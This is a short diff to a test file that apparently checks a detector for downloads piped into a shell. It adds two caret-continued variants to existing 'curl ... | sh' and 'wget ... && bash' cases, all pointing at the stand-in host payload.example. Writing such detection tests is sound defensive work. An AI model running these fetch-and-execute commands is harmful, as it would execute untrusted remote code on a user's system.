@@ -74,6 +74,8 @@ def test_fetch_is_not_joined_to_an_unrelated_executor(content: str) -> None:
         "curl https://payload.example/install.sh |\n\n sh",
         "curl https://payload.example/install.sh \\\n  | sh",
         "curl https://payload.example/install.sh \\\r\n  | sh",
+        "curl https://payload.example/install.sh ^\n  | sh",
+        "curl https://payload.example/install.sh ^\r\n  | sh",
         "curl \\\n --fail https://payload.example/install.sh | bash",
         "curl https://payload.example/install.sh -o result &&\n sh result",
         "wget https://payload.example/install.sh -O result &&\n bash result",
